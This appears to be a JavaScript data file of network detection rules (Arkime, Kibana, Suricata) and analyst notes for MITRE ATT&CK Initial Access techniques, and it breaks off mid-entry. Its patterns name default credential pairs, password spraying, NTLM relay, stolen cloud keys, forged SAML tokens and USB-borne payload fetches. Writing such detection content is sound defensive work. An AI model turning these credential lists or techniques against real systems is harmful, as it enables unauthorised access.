// TA0001 - Initial Access
// 9 techniques · 67 indicators · network-visible detection focus

const DATA = [
  {
    id: "T1078",
    name: "Valid Accounts",
    desc: ".001 Default · .002 Domain · .003 Local · .004 Cloud",
    rows: [
      {
        sub: "T1078.001 - Default Accounts",
        indicator: "Default credential attempt on network device / appliance management interface",
        arkime: "ip.src != $MPNET\n&& protocols == http\n&& http.method == POST\n&& http.uri == [\"*/login*\", \"*/auth*\", \"*/cgi-bin/luci*\", \"*/api/v1/auth*\", \"*/admin*\"]\n&& http.reqbody == [\"*admin=admin*\", \"*username=admin&password=admin*\", \"*user=admin&pass=admin*\", \"*username=root&password=root*\", \"*password=1234*\", \"*password=default*\", \"*password=password*\", \"*\\\"password\\\":\\\"admin\\\"*\", \"*\\\"password\\\":\\\"root\\\"*\", \"*\\\"password\\\":\\\"password\\\"*\", \"*\\\"password\\\":\\\"1234\\\"*\", \"*\\\"password\\\":\\\"default\\\"*\", \"*\\\"username\\\":\\\"admin\\\"*\", \"*\\\"user\\\":\\\"admin\\\"*\"]",
        kibana: "NOT source.ip: $MPNET\nAND http.request.method: POST\nAND url.path: (\n  *login* OR *auth*\n  OR *cgi-bin/luci*\n  OR *api/v1/auth*\n  OR *admin*\n)\nAND http.request.body: (\n  *admin=admin*\n  OR *username=admin*\n  OR *password=1234*\n  OR *password=default*\n  OR *password=password*\n  OR *\"password\":\"admin\"*\n  OR *\"password\":\"root\"*\n  OR *\"password\":\"password\"*\n  OR *\"password\":\"1234\"*\n  OR *\"password\":\"default\"*\n  OR *\"username\":\"admin\"*\n)",
        suricata: "alert http $EXTERNAL_NET any\n  -> $HOME_NET any\n  (msg:\"TA0001 T1078.001 Default\n    credential attempt network\n    device management\";\n  flow:established,to_server;\n  content:\"POST\"; http.method;\n  pcre:\"/(username|user|login)=\n    (admin|root|administrator)\n    .{0,20}(password|pass|pwd)=\n    (admin|root|1234|default|\n    password|123456)/i\";\n  http.request_body;\n  classtype:attempted-user;\n  sid:9107801; rev:1;)",
        notes: "Default credentials on network devices, IP cameras, NAS, routers, and management interfaces are trivially exploited - admin/admin, admin/password, root/root, admin/1234 cover the majority of default credential sets. Focus on management interface paths from external IPs. A 200 response with a session token or redirect to a dashboard = successful default credential login. Maintain an inventory of devices with known default credentials and change them - detection is a backstop, not the primary control.",
        apt: [
          { cls: "apt-cn", name: "Volt Typhoon", note: "Exploits default credentials on SOHO routers and network appliances to establish LOTL infrastructure within US critical infrastructure networks." },
          { cls: "apt-ru", name: "Sandworm", note: "Uses default credentials on industrial control system components and network devices in targeting of Ukrainian and European infrastructure." },
          { cls: "apt-mul", name: "Multi", note: "Default credential exploitation requires zero sophistication and is effective against a large percentage of deployed network devices." }
        ],
        cite: "MITRE ATT&CK T1078.001, CISA advisories, industry reporting"
      },
      {
        sub: "T1078.002 - Domain Accounts",
        indicator: "[OFF-NET TRIPWIRE] Kerberos authentication from external IP - domain account used outside the network perimeter",
        arkime: "ip.src != $MPNET\n&& ip.src != $EXTERNAL_VPN_RANGES\n&& port.dst == [88, 464]\n&& protocols == kerberos\n&& databytes.src > 0\n&& databytes.dst > 0",
        kibana: "NOT source.ip: $MPNET\nAND NOT source.ip: $EXTERNAL_VPN_RANGES\nAND destination.port: (88 OR 464)\nAND network.transport: (tcp OR udp)\nAND source.bytes > 0",
        suricata: "alert udp $EXTERNAL_NET any\n  -> $HOME_NET 88\n  (msg:\"TA0001 T1078.002 External\n    Kerberos auth domain account\n    outside perimeter\";\n  flow:stateless;\n  content:\"|6a|\"; depth:1;\n  classtype:policy-violation;\n  sid:9107802; rev:1;)",
        notes: "[AIR-GAP TRIPWIRE] This indicator detects connections to off-MPNet infrastructure that should be unreachable from an air-gapped environment. Any hit indicates a likely air-gap violation: bridged USB tether, rogue cellular modem, vendor/maintenance laptop bridging networks, supply-chain implant calling home, or misconfigured perimeter device. Treat as priority-1 escalation; do not dismiss as false positive without thorough investigation. Kerberos (TCP/UDP 88) should never be reachable from external IPs - it is an internal-only authentication protocol. External Kerberos connections indicate either a perimeter misconfiguration (DC exposed to internet) or an adversary with network-level access routing traffic through a compromised internal host. Content '|6a|' matches the Kerberos AS-REQ message tag. If your DC's port 88 is reachable externally this is a critical misconfiguration. Zeek kerberos.log captures all Kerberos AS-REQ and TGS-REQ details including CNameString (username) and error codes.",
        apt: [
          { cls: "apt-ru", name: "APT29", note: "Uses stolen domain credentials to authenticate via Kerberos, with external Kerberos authentication visible when adversaries have established network-level access." },
          { cls: "apt-cn", name: "APT10", note: "Used domain credentials stolen from MSP environments to authenticate to customer AD environments via Kerberos." },
          { cls: "apt-mul", name: "Multi", note: "External Kerberos authentication is documented as a critical misconfiguration indicator in NSA and CISA AD security advisories." }
        ],
        cite: "MITRE ATT&CK T1078.002, NSA AD security guidance, industry reporting"
      },
      {
        sub: "T1078.002 - Domain Accounts",
        indicator: "NTLM authentication relay - NTLMv1/v2 challenge-response from unexpected external source",
        kibana: "NOT source.ip: $MPNET\nAND http.request.headers.authorization: (\n  *NTLM* OR *Negotiate TlRM*\n)\nAND NOT source.ip: $ALLOWED_PARTNERS\nAND destination.port: (\n  445 OR 80 OR 443\n)",
        suricata: "alert tcp $EXTERNAL_NET any\n  -> $HOME_NET [80,443,445]\n  (msg:\"TA0001 T1078.002 NTLM auth\n    from external source possible\n    relay or hash use\";\n  flow:established,to_server;\n  content:\"NTLM\"; http.header;\n  content:\"|4e 54 4c 4d 53 53 50|\";\n  classtype:policy-violation;\n  sid:9107803; rev:1;)",
        notes: "Content '|4e 54 4c 4d 53 53 50|' = 'NTLMSSP' - the NTLM authentication magic bytes present in every NTLM negotiate/challenge/authenticate message. External NTLM authentication to your web or SMB services indicates either a misconfigured application exposing Windows auth externally or an adversary relaying captured NTLM hashes (pass-the-hash) or performing an NTLM relay attack. NTLMv1 is catastrophically weak - challenge-response can be cracked offline. External NTLM to port 445 = critical finding.",
        apt: [
          { cls: "apt-ru", name: "APT28", note: "Uses NTLM relay attacks to capture and relay domain credentials, documented in operations against government and military targets." },
          { cls: "apt-cn", name: "APT10", note: "Captured and replayed NTLM hashes in MSP targeting during Cloud Hopper." },
          { cls: "apt-mul", name: "Multi", note: "NTLM relay is a foundational lateral movement technique documented across virtually all nation-state and criminal actor profiles operating in Windows environments." }
        ],
        cite: "MITRE ATT&CK T1078.002, T1557.001, industry reporting"
      },
      {
        sub: "T1078.002 - Domain Accounts",
        indicator: "Password spray - low-volume auth attempts across many accounts from single external source",
        arkime: "ip.src != $MPNET\n&& protocols == https\n&& http.method == POST\n&& host.http == [\"*login.microsoftonline.com*\", \"*accounts.google.com*\", \"*okta.com*\", $OWA_SERVER, $ADFS_SERVER]\n&& http.statuscode == [401, 403]",
        kibana: "NOT source.ip: $MPNET\nAND http.response.status_code: (\n  401 OR 403\n)\nAND url.domain: (\n  *login.microsoftonline.com*\n  OR *accounts.google.com*\n  OR *okta.com*\n)\nAND source.bytes > 0",
        suricata: "alert http $EXTERNAL_NET any\n  -> $HOME_NET any\n  (msg:\"TA0001 T1078.002 Password\n    spray auth failures IdP\n    endpoint\";\n  flow:established,to_server;\n  content:\"POST\"; http.method;\n  pcre:\"/(login\\.microsoftonline|\n    accounts\\.google|\n    okta\\.com)/i\";\n  http.header;\n  content:\"40\"; http.stat_code;\n  threshold:type both,\n    track by_src,\n    count 5, seconds 300;\n  classtype:attempted-user;\n  sid:9107804; rev:1;)",
        notes: "Password spraying uses a single password against many accounts to avoid lockout - distinguishable from brute force by low per-account attempt count (1-3) and high unique account count. Network-visible signal: many HTTP 401/403 responses from the same source IP against an IdP endpoint within a time window. Detection threshold must be tuned to your environment's legitimate failed auth rate. Distributed sprays use many source IPs with low per-source rate - aggregate by user agent or ASN. Watch for Microsoft's UserRealmDiscovery requests (GetCredentialType) which adversaries use to identify valid accounts before spraying.",
        apt: [
          { cls: "apt-ru", name: "APT28", note: "Conducts large-scale password spraying against Office 365 and on-premises Exchange infrastructure targeting government, defense, and think tank organizations per NSA/CISA AA20-296A." },
          { cls: "apt-ru", name: "Midnight Blizzard", note: "Uses password spraying against Microsoft 365 tenants as a precursor to targeted access." },
          { cls: "apt-ir", name: "APT33", note: "Password sprays against energy sector Office 365 tenants and OWA infrastructure." }
        ],
        cite: "MITRE ATT&CK T1078.002, T1110.003, NSA/CISA AA20-296A"
      },
      {
        sub: "T1078.003 - Local Accounts",
        indicator: "Local admin credential use over SMB from external / unexpected source",
        arkime: "ip.src != $MPNET\n&& port.dst == 445\n&& protocols == smb\n&& smb.user == [\"*administrator*\", \"*admin*\", \"*localadmin*\", \"*sysadmin*\"]\n&& databytes.src > 0\n&& databytes.dst > 0",
        kibana: "NOT source.ip: $MPNET\nAND destination.port: 445\nAND network.transport: tcp\nAND smb.user: (\n  *administrator*\n  OR *admin*\n  OR *localadmin*\n)\nAND source.bytes > 0\nAND destination.bytes > 0",
        suricata: "alert tcp $EXTERNAL_NET any\n  -> $HOME_NET 445\n  (msg:\"TA0001 T1078.003 SMB local\n    admin auth from external\n    source\";\n  flow:established,to_server;\n  content:\"|ff 53 4d 42|\"; depth:5;\n  classtype:policy-violation;\n  sid:9107805; rev:1;)",
        notes: "Local administrator accounts used over SMB from external IPs indicate either a perimeter misconfiguration (SMB internet-exposed - critical) or an adversary who has obtained local credentials and is authenticating remotely. External TCP/445 should never reach internal hosts - any successful SMB session from external IPs is a P0 finding. Internally, lateral movement using local admin accounts over SMB is covered in TA0008. Zeek smb.log captures username, domain, and auth success/failure.",
        apt: [
          { cls: "apt-kp", name: "Lazarus", note: "Uses local administrator credentials over SMB for lateral movement and remote access in financial sector targeting." },
          { cls: "apt-ru", name: "Sandworm", note: "Uses local admin credential access over SMB in destructive operations against Ukrainian infrastructure." },
          { cls: "apt-mul", name: "Multi", note: "Local admin SMB access is a primary lateral movement technique in ransomware operations and is documented in FBI and CISA ransomware advisories." }
        ],
        cite: "MITRE ATT&CK T1078.003, T1021.002, CISA advisories"
      },
      {
        sub: "T1078.004 - Cloud Accounts",
        indicator: "[OFF-NET TRIPWIRE] Cloud service account / API key use from unexpected IP - stolen key or token abuse",
        arkime: "ip.src != $MPNET\n&& ip.src != $EXTERNAL_CI_CD\n&& protocols == https\n&& host.http == [\"*sts.amazonaws.com*\", \"*oauth2.googleapis.com*\", \"*login.microsoftonline.com*\", \"*iam.amazonaws.com*\"]\n&& http.method == POST\n&& http.reqbody == [\"*grant_type=client_credentials*\", \"*grant_type=urn:ietf:params*\", \"*Action=AssumeRole*\", \"*Action=GetSessionToken*\"]\n&& ip.src != $ALLOWED_DEFAULTS",
        kibana: "NOT source.ip: $MPNET\nAND NOT source.ip: $EXTERNAL_CI_CD\nAND http.request.method: POST\nAND url.domain: (\n  *sts.amazonaws.com*\n  OR *oauth2.googleapis.com*\n  OR *login.microsoftonline.com*\n  OR *iam.amazonaws.com*\n)\nAND http.request.body: (\n  *client_credentials*\n  OR *AssumeRole*\n  OR *GetSessionToken*\n)",
        suricata: "alert http $EXTERNAL_NET any\n  -> $EXTERNAL_NET 443\n  (msg:\"TA0001 T1078.004 Cloud\n    service account auth from\n    unexpected IP stolen key\";\n  flow:established,to_server;\n  content:\"POST\"; http.method;\n  pcre:\"/(sts\\.amazonaws\\.com|\n    oauth2\\.googleapis\\.com|\n    login\\.microsoftonline\\.com|\n    iam\\.amazonaws\\.com)/i\";\n  http.header;\n  pcre:\"/(grant_type=\n    client_credentials|\n    AssumeRole|\n    GetSessionToken)/i\";\n  http.request_body;\n  classtype:policy-violation;\n  sid:9107806; rev:1;)",
        notes: "[AIR-GAP TRIPWIRE] This indicator detects connections to off-MPNet infrastructure that should be unreachable from an air-gapped environment. Any hit indicates a likely air-gap violation: bridged USB tether, rogue cellular modem, vendor/maintenance laptop bridging networks, supply-chain implant calling home, or misconfigured perimeter device. Treat as priority-1 escalation; do not dismiss as false positive without thorough investigation. Cloud service accounts and API keys are long-lived credentials that don't require MFA - a stolen key works indefinitely until rotated. AWS STS AssumeRole and GetSessionToken from unexpected IPs indicate stolen IAM credentials. OAuth2 client_credentials grant from unknown IPs indicates stolen service account credentials. Requires egress SSL inspection to see request bodies against cloud STS endpoints. Correlate with your cloud provider's audit logs (CloudTrail, Azure Activity, GCP Audit) - network layer detection catches the authentication attempt; cloud audit logs tell you what the account did afterward.",
        apt: [
          { cls: "apt-ru", name: "APT29", note: "Uses stolen OAuth tokens and service account credentials to access cloud environments, documented in CISA and NSA advisories on APT29 cloud targeting." },
          { cls: "apt-mul", name: "Scattered Spider", note: "Steals cloud API keys and service account credentials via social engineering then accesses cloud environments from adversary-controlled IPs." },
          { cls: "apt-cn", name: "APT41", note: "Uses stolen cloud service account credentials in targeted intrusion campaigns against technology sector cloud infrastructure." }
        ],
        cite: "MITRE ATT&CK T1078.004, T1552.001, CISA cloud security advisories"
      },
      {
        sub: "T1078.004 - Cloud Accounts",
        indicator: "Federated identity token abuse - SAML golden ticket or OAuth token from anomalous issuer",
        arkime: "ip.src != $MPNET\n&& protocols == https\n&& http.method == POST\n&& http.reqbody == [\"*SAMLResponse=*\", \"*grant_type=urn:ietf:params:oauth:grant-type:saml2-bearer*\"]\n&& host.http != $ALLOWED_IDPS\n&& databytes.src > 500",
        kibana: "NOT source.ip: $MPNET\nAND http.request.method: POST\nAND http.request.body:\n  *SAMLResponse=*\nAND NOT url.domain: $ALLOWED_IDPS\nAND source.bytes > 500",
        suricata: "alert http $EXTERNAL_NET any\n  -> $EXTERNAL_NET 443\n  (msg:\"TA0001 T1078.004 SAML\n    response from unexpected\n    issuer golden ticket abuse\";\n  flow:established,to_server;\n  content:\"POST\"; http.method;\n  content:\"SAMLResponse=\";\n  http.request_body;\n  classtype:policy-violation;\n  sid:9107807; rev:1;)",
        notes: "SAML golden ticket attacks (Solorigate/SolarWinds TTPs) forge SAML tokens using a compromised ADFS token signing certificate - the forged token is accepted by cloud services (Azure AD, AWS) as legitimate. Network signal: SAMLResponse POST from an unexpected host or to a cloud service that should be receiving SAML assertions from your ADFS/IdP. Compare the SAMLResponse Issuer field against your known IdP entity IDs. Also watch for OAuth token grant requests using the SAML bearer assertion grant type from unexpected IPs.",
        apt: [
          { cls: "apt-ru", name: "APT29", note: "Used forged SAML tokens via compromised ADFS token signing certificates in the SolarWinds/Solorigate campaign to access Microsoft 365 and Azure AD tenants of thousands of organizations." },
          { cls: "apt-mul", name: "Multi", note: "SAML golden ticket abuse is documented in CISA Emergency Directive 21-01 and Microsoft MSTIC reporting on the SolarWinds campaign." }
        ],
        cite: "MITRE ATT&CK T1078.004, T1606.002, CISA ED-21-01, Microsoft MSTIC"
      }
    ]
  },
  {
    id: "T1091",
    name: "Replication Through Removable Media",
    desc: "USB / external storage propagation - air-gap bridging and post-execution C2",
    rows: [
      {
        sub: "T1091 - Post-USB Execution",
        indicator: "[OFF-NET TRIPWIRE] New outbound beacon from host within 5 minutes of USB device insertion event",
        arkime: "ip.src == $MPNET\n&& ip.dst != $ALLOWED_DEFAULTS\n&& port.dst == [443, 80, 8080, 53, 4444]\n&& packets.src > 5\n&& packets.src < 50\n&& session.length > 60\n// USB event correlation is not a network signal -\n// requires SIEM join with EDR/Sysmon Event 9\n// (RawAccessRead on USB) or Windows Event 6416\n// (USB device insertion). The <300s post-insertion\n// window must be applied at SIEM correlation time.",
        kibana: "source.ip: $MPNET\nAND NOT destination.ip: $ALLOWED_DEFAULTS\nAND destination.port: (\n  443 OR 80 OR 8080\n  OR 53 OR 4444\n)\nAND network.packets: [5 TO 50]\nAND event.duration > 60000000",
        suricata: "alert tcp $HOME_NET any\n  -> $EXTERNAL_NET\n  [80,443,8080,4444]\n  (msg:\"TA0001 T1091 New outbound\n    beacon possible USB payload\n    activation\";\n  flow:established,to_server;\n  threshold:type both,\n    track by_src,\n    count 1, seconds 300;\n  classtype:trojan-activity;\n  sid:9109101; rev:1;)",
        notes: "[AIR-GAP TRIPWIRE] This indicator detects outbound traffic from MPNET to off-MPNET infrastructure. In a properly air-gapped environment this query should never produce hits; any hit indicates a likely air-gap violation: bridged USB tether, rogue cellular modem, vendor/maintenance laptop bridging networks, supply-chain implant calling home, or misconfigured perimeter device. Treat as priority-1 escalation; do not dismiss as false positive without thorough investigation. Detection requires correlation between Windows Event 6416 (USB device insertion), Sysmon Event 9 (RawAccessRead on USB), or EDR USB telemetry and subsequent first-seen outbound network connections. The window is short - most USB-borne payloads beacon within seconds of execution. Build per-host network baselines: any new outbound destination IP appearing within 5 minutes of a USB event from a host that previously didn't communicate with that destination is a strong signal. Air-gapped or OT networks: any outbound from a host that just had a USB inserted is itself anomalous regardless of destination.",
        apt: [
          { cls: "apt-ru", name: "Sandworm", note: "Has used USB-based propagation in operations targeting Ukrainian critical infrastructure, including OT and ICS environments where USB is often the only ingress vector." },
          { cls: "apt-cn", name: "Mustang Panda", note: "Extensively uses USB-based propagation (PlugX variant) targeting government and NGO sectors across Asia-Pacific, with infected USBs delivering payloads that immediately establish C2 beacons." },
          { cls: "apt-mul", name: "Multi", note: "USB-based propagation is documented in CISA advisories on critical infrastructure protection and ICS security as a primary air-gap-bridging technique." }
        ],
        cite: "MITRE ATT&CK T1091, CISA advisories, industry reporting"
      },
      {
        sub: "T1091 - Worm Propagation",
        indicator: "Burst of outbound SMB connections from single host - Stuxnet-class worm propagation",
        arkime: "ip.src == $MPNET\n&& port.dst == 445\n&& protocols == smb\n&& ip.dst == $MPNET\n&& packets.src > 0",
        kibana: "source.ip: $MPNET\nAND destination.ip: $MPNET\nAND destination.port: 445\nAND network.transport: tcp",
        suricata: "alert tcp $HOME_NET any\n  -> $HOME_NET 445\n  (msg:\"TA0001 T1091 SMB connection\n    burst possible USB-borne worm\n    propagation\";\n  flow:established,to_server;\n  content:\"|ff 53 4d 42|\"; depth:5;\n  threshold:type both,\n    track by_src,\n    count 10, seconds 60;\n  classtype:trojan-activity;\n  sid:9109102; rev:1;)",
        notes: "USB-borne worms (Stuxnet, Conficker, USB Thief, Raspberry Robin) propagate by enumerating network shares and copying themselves. Network signal: a single internal host suddenly initiating SMB connections to many other internal hosts in rapid succession. Workstations don't normally connect to other workstations via SMB - endpoint-to-endpoint SMB is highly suspicious. Servers receiving connections from many workstations is normal; one workstation connecting to many others is not. Threshold: 10 SMB connections in 60 seconds from a single source is conservative - Stuxnet/Conficker generated dozens per minute.",
        apt: [
          { cls: "apt-ru", name: "Sandworm", note: "Used USB-borne payloads with SMB propagation in operations against Ukrainian infrastructure." }
        ],
        malware: [
          { cls: "apt-mul", name: "Stuxnet", note: "Used USB-based propagation followed by SMB-based lateral movement targeting Siemens industrial systems." },
          { cls: "apt-mul", name: "Conficker", note: "Demonstrated the network signal at scale - millions of hosts generating SMB propagation patterns." }
        ],
        cite: "MITRE ATT&CK T1091, T1021.002, CISA ICS-CERT"
      },
      {
        sub: "T1091 - Worm Propagation",
        indicator: "SMB write to ADMIN$ / C$ share from non-admin host - payload drop via removable media propagation",
        arkime: "ip.src == $WORKSTATIONS\n&& port.dst == 445\n&& protocols == smb\n&& smb.share == [\"*ADMIN$*\", \"*C$*\", \"*IPC$*\"]\n&& databytes.src > 0\n// smb.command does not exist in baseline Arkime 4.3.1.\n// Write/create operations are proxied by databytes.src > 0\n// (data flowing src→dst = upload/write). For definitive\n// command-type filtering, use Zeek smb_files.log action\n// field (SMB_FILE_WRITE) via SIEM.\n&& ip.dst == $MPNET",
        kibana: "source.ip: $WORKSTATIONS\nAND destination.ip: $MPNET\nAND destination.port: 445\nAND smb.share: (\n  *ADMIN$* OR *C$* OR *IPC$*\n)",
        suricata: "alert tcp $WORKSTATIONS any\n  -> $HOME_NET 445\n  (msg:\"TA0001 T1091 SMB write to\n    admin share from user VLAN\n    possible worm\";\n  flow:established,to_server;\n  content:\"|ff 53 4d 42|\"; depth:5;\n  content:\"ADMIN$\"; nocase;\n  classtype:trojan-activity;\n  sid:9109103; rev:1;)",
        notes: "If you ship Zeek logs to Kibana, you can sharpen this KQL by adding zeek.smb_files.action or zeek.smb_cmd.command filters (e.g. \"SMB_FILE_READ\" / \"SMB_FILE_WRITE\" / \"get_dfs_referral\") - the baseline KQL above falls back to port/protocol since Zeek shipping is not assumed. USB-borne worms drop their payload to administrative shares (ADMIN$ = C:\\Windows on remote host, C$ = C:\\, IPC$ = inter-process communication) on neighboring systems. End-user workstations should never write to ADMIN$ or C$ on other workstations - this is admin tooling territory only. Detection: any SMB CREATE or WRITE operation targeting ADMIN$/C$ from a user VLAN source. Legitimate use cases (Group Policy, SCCM, RMM tools) come from known admin server VLANs, not user workstations.",
        apt: [
          { cls: "apt-mul", name: "Raspberry Robin", note: "Criminal worm with documented use by EvilCorp/Indrik Spider that propagates via USB and uses SMB-based lateral movement to ADMIN$ shares." },
          { cls: "apt-ru", name: "Sandworm", note: "Has used SMB-based payload drops following USB ingress in operations against Ukrainian infrastructure." }
        ],
        malware: [
          { cls: "apt-mul", name: "Stuxnet", note: "Wrote payloads to ADMIN$ shares on neighboring Windows systems as its primary lateral propagation method following USB initial access." }
        ],
        cite: "MITRE ATT&CK T1091, T1021.002, NSA AD security"
      },
      {
        sub: "T1091 - Air-Gap Bridging",
        indicator: "Network traffic from previously air-gapped / segmented host - USB-borne network bridge",
        arkime: "ip.src == $MPNET\n&& protocols != [arp, dhcp, ntp]\n&& ip.dst != $MPNET\n&& databytes.src > 0",
        kibana: "source.ip: $MPNET\nAND NOT destination.ip: $MPNET\nAND NOT network.protocol: (\n  arp OR dhcp OR ntp\n)\nAND source.bytes > 0",
        suricata: "alert ip $MPNET any\n  -> !$MPNET any\n  (msg:\"TA0001 T1091 Traffic from\n    air-gapped VLAN possible USB\n    bridging\";\n  classtype:policy-violation;\n  sid:9109104; rev:1;)",
        notes: "In environments with air-gapped or strictly segmented VLANs (OT/ICS, classified networks, financial trading floors), any unexpected outbound traffic is a critical indicator. USB-borne malware can bridge air gaps either by configuring the infected host as a routing hop, exfiltrating data via the next time a USB is used to physically move data, or by abusing covert channels. Detection: define the expected traffic profile for your air-gapped segments (typically just ARP, DHCP, and NTP within the segment) and alert on anything else. Pair with USB device insertion events on hosts in those segments.",
        apt: [
          { cls: "apt-ru", name: "Turla", note: "Has used USB-based techniques to deliver payloads into segmented diplomatic networks." },
          { cls: "apt-ru", name: "Sandworm", note: "Has bridged segmented Ukrainian government and critical infrastructure networks via USB ingress." }
        ],
        malware: [
          { cls: "apt-mul", name: "Stuxnet", note: "Specifically designed to bridge the air gap to Iranian uranium enrichment networks via USB media - the original air-gap bridging case study." }
        ],
        cite: "MITRE ATT&CK T1091, CISA ICS-CERT, industry reporting"
      },
      {
        sub: "T1091 - Stage-Two Payload",
        indicator: "[OFF-NET TRIPWIRE] Internal host fetching second-stage payload after autorun-pattern execution - LNK / autorun.inf signal",
        arkime: "ip.src == $MPNET\n&& protocols == http\n&& http.method == GET\n&& http.uri == [\"*.bin\", \"*.dat\", \"*.exe\", \"*.dll\", \"*.ps1\", \"*.scr\"]\n&& ip.dst != $ALLOWED_DEFAULTS\n// Domain-age filtering and USB event correlation are\n// not available in baseline Arkime 4.3.1. Pair this\n// query with external domain-age enrichment for the\n// <30d signal, and join with EDR/Sysmon Event 9\n// (RawAccessRead on USB) or Windows Event 6416 in\n// the SIEM for the <60s post-USB-insertion correlation.",
        kibana: "source.ip: $MPNET\nAND http.request.method: GET\nAND url.path: (\n  *.bin OR *.dat\n  OR *.exe OR *.dll\n  OR *.ps1 OR *.scr\n)\nAND NOT destination.ip: $ALLOWED_DEFAULTS",
        suricata: "alert http $HOME_NET any\n  -> $EXTERNAL_NET any\n  (msg:\"TA0001 T1091 Second-stage\n    payload fetch post USB possible\n    autorun activation\";\n  flow:established,to_server;\n  content:\"GET\"; http.method;\n  pcre:\"/\\.(bin|dat|exe|dll|\n    ps1|scr|ico)\\b/i\";\n  http.uri;\n  classtype:trojan-activity;\n  sid:9109105; rev:1;)",
        notes: "[AIR-GAP TRIPWIRE] This indicator detects outbound traffic from MPNET to off-MPNET infrastructure. In a properly air-gapped environment this query should never produce hits; any hit indicates a likely air-gap violation: bridged USB tether, rogue cellular modem, vendor/maintenance laptop bridging networks, supply-chain implant calling home, or misconfigured perimeter device. Treat as priority-1 escalation; do not dismiss as false positive without thorough investigation. Modern USB-borne malware often uses LNK files or registered file handlers (autorun.inf is largely deprecated but still abused on legacy systems) that execute a small first-stage downloader. The downloader fetches the actual payload from an external server. Network signal: HTTP GET for an executable, DLL, PowerShell script, or generic binary file from an unfamiliar host within 60 seconds of a USB device event. Raspberry Robin specifically uses .lnk files on USBs that fetch payloads from compromised QNAP devices. User-Agent often reveals the downloader: WinHTTP, BITS/7.5, PowerShell, certutil - these from a workstation right after USB insertion are highly suspicious.",
        apt: [
          { cls: "apt-mul", name: "Raspberry Robin", note: "Uses USB-based .lnk file infection followed by HTTP downloads of second-stage payloads - associated with EvilCorp/Indrik Spider and used as a precursor to ransomware deployment." },
          { cls: "apt-cn", name: "Mustang Panda", note: "Uses USB-based LNK propagation followed by HTTP stage-two downloads in operations against government and NGO sectors." },
          { cls: "apt-mul", name: "Multi", note: "The pattern of LNK execution followed by HTTP payload fetch is documented in CISA advisories and Microsoft Threat Intelligence reporting." }
        ],
        cite: "MITRE ATT&CK T1091, T1204.002, CISA advisories, Microsoft MSTIC"
      }
    ]
  },
  {
    id: "T1133",
    name: "External Remote Services",
    desc: "VPN · RDP · SSH · Citrix · Cloud management - credential abuse and brute force",
    rows: [
      {
        sub: "T1133 - VPN Anomalies",
        indicator: "[OFF-NET TRIPWIRE] VPN authentication from unexpected geolocation - impossible travel or first-seen country",
        arkime: "ip.dst == $VPN_SERVERS\n&& protocols == [ssl, tls, udp]\n&& port.dst == [443, 4433, 8443, 500, 4500, 1194, 1723]\n&& ip.src != $EXTERNAL_VPN_GEOS\n&& databytes.src > 0\n&& databytes.dst > 0",
        kibana: "destination.ip: $VPN_SERVERS\nAND destination.port: (\n  443 OR 4433 OR 8443\n  OR 500 OR 4500\n  OR 1194 OR 1723\n)\nAND NOT source.geo.country_iso_code:\n  $ALLOWED_COUNTRIES\nAND source.bytes > 0",
        suricata: "alert tcp $EXTERNAL_NET any\n  -> $HOME_NET\n  [443,4433,8443,1194,1723]\n  (msg:\"TA0001 T1133 VPN auth\n    from unexpected geo\n    possible stolen cred\";\n  flow:established,to_server;\n  content:\"|16 03|\"; depth:2;\n  threshold:type both,\n    track by_dst,\n    count 3, seconds 60;\n  classtype:policy-violation;\n  sid:9113301; rev:1;)",
        notes: "[AIR-GAP TRIPWIRE] This indicator detects connections to off-MPNet infrastructure that should be unreachable from an air-gapped environment. Any hit indicates a likely air-gap violation: bridged USB tether, rogue cellular modem, vendor/maintenance laptop bridging networks, supply-chain implant calling home, or misconfigured perimeter device. Treat as priority-1 escalation; do not dismiss as false positive without thorough investigation. Geolocation-based VPN anomaly detection is most effective when combined with user baseline data - a user who always authenticates from the US suddenly connecting from Eastern Europe or Southeast Asia is high-confidence. Impossible travel: same account authenticating from two geographically distant locations within a timeframe physically impossible for travel (e.g., US and Russia within 2 hours). First-seen country: account authenticating from a country it has never previously used. IKEv2 uses UDP/500 and UDP/4500; SSL VPN uses TCP/443 or TCP/4433; OpenVPN uses UDP or TCP/1194; PPTP uses TCP/1723.",
        apt: [
          { cls: "apt-ru", name: "APT29", note: "Uses stolen credentials to authenticate to VPN services from adversary-controlled infrastructure, generating impossible travel indicators when the compromised account is also legitimately active." },
          { cls: "apt-cn", name: "APT10", note: "Used stolen VPN credentials to access MSP customer networks during Cloud Hopper, authenticating from unexpected geolocations." },
          { cls: "apt-ir", name: "APT33", note: "Uses stolen credentials to access energy sector VPN infrastructure from Iranian IP ranges." }
        ],
        cite: "MITRE ATT&CK T1133, T1078, CISA advisories"
      },
      {
        sub: "T1133 - VPN Anomalies",
        indicator: "VPN authentication outside business hours from new source IP - off-hours credential use",
        arkime: "ip.dst == $VPN_SERVERS\n&& protocols == tls\n&& port.dst == [443, 4433, 8443]\n&& ip.src != $EXTERNAL_VPN_IPS\n&& databytes.src > 1000\n&& databytes.dst > 1000\n// Time-of-day filtering (hour > 22 || hour < 6) is\n// not expressible in the Arkime query language. Use\n// the Arkime UI timeframe selector for off-hours\n// windows, or apply the time filter at SIEM\n// correlation time. Suricata threshold below catches\n// the new-source-IP burst regardless of hour.",
        kibana: "destination.ip: $VPN_SERVERS\nAND destination.port: (\n  443 OR 4433 OR 8443\n)\nAND NOT source.ip: $EXTERNAL_VPN_IPS\nAND source.bytes > 1000\n// KQL has no native time-of-day filter. To filter\n// to 22:00-06:00 local, define an Elasticsearch\n// runtime field that derives hour_of_day from\n// @timestamp, then use AND hour_of_day >= 22 OR\n// hour_of_day < 6, OR apply via Lens/dashboard\n// time-bucket filtering.",
        suricata: "alert tcp $EXTERNAL_NET any\n  -> $HOME_NET [443,4433,8443]\n  (msg:\"TA0001 T1133 VPN auth\n    off-hours new source IP\";\n  flow:established,to_server;\n  content:\"|16 03|\"; depth:2;\n  content:\"|01|\"; offset:5;\n  depth:1;\n  threshold:type both,\n    track by_src,\n    count 1, seconds 300;\n  classtype:policy-violation;\n  sid:9113302; rev:1;)",
        notes: "Off-hours VPN connections from new source IPs combine two anomaly signals into a higher-confidence indicator. Adversaries authenticating with stolen credentials often do so outside business hours to reduce detection risk and analyst response time. Content '|16 03|' = TLS record header, '|01|' at offset 5 = ClientHello - identifies an active TLS handshake initiation. Build a per-account VPN source IP baseline - the first connection from a new IP address during off-hours (22:00-06:00 local) warrants investigation regardless of successful authentication.",
        apt: [
          { cls: "apt-ru", name: "Midnight Blizzard", note: "Conducts VPN and remote access operations outside target organization business hours to minimize detection response, documented in Microsoft and CISA advisories." },
